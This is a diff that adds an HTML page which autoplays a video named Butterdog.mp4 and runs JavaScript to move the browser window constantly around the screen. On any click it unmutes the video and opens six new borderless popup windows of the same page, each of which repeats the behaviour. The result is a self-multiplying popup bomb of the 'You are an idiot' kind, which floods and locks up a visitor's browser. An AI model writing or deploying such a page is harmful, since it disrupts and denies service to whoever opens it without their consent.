@@ -1,0 +1,83 @@
+<body>
+    <!-- Background Video -->
+    <video autoplay muted loop id="background-video" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -1;">
+        <source src="Butterdog.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <script>
+        var xOff = 5;
+        var yOff = 5;
+        var xPos = 400;
+        var yPos = -100;
+        var flagRun = 1;
+
+        function openWindow(url, features) {
+            window.open(url, "_blank", features);
+        }
+
+        function newXlt() {
+            xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
+            window.focus();
+        }
+
+        function newXrt() {
+            xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+        }
+
+        function procreate() {
+            const windowFeatures = 'menubar=no,status=no,toolbar=no,resizable=no,width=200,height=200,titlebar=no,alwaysRaised=yes';
+            openWindow('index.html', windowFeatures);
+            openWindow('index.html', windowFeatures);
+            openWindow('index.html', windowFeatures);
+            openWindow('index.html', windowFeatures);
+            openWindow('index.html', windowFeatures);
+            openWindow('index.html', windowFeatures);
+        }
+
+        function newYup() {
+            yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
+        }
+
+        function newYdn() {
+            yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+        }
+
+        function fOff() {
+            flagRun = 0;
+        }
+
+        function pb() {
+            xPos += xOff;
+            yPos += yOff;
+            if (xPos > screen.width - 175) {
+                newXlt();
+            }
+            if (xPos < 0) {
+                newXrt();
+            }
+            if (yPos > screen.height - 100) {
+                newYup();
+            }
+            if (yPos < 0) {
+                newYdn();
+            }
+            if (flagRun == 1) {
+                window.moveTo(xPos, yPos);
+                setTimeout(pb, 1);
+            }
+        }
+
+        // Play video instantly
+        var video = document.getElementById('background-video');
+        video.play();
+
+        // Add click event listener to unmute video and call procreate()
+        document.body.addEventListener('click', function() {
+            video.muted = false;
+            procreate();
+        });
+
+        pb();
+    </script>
+</body>
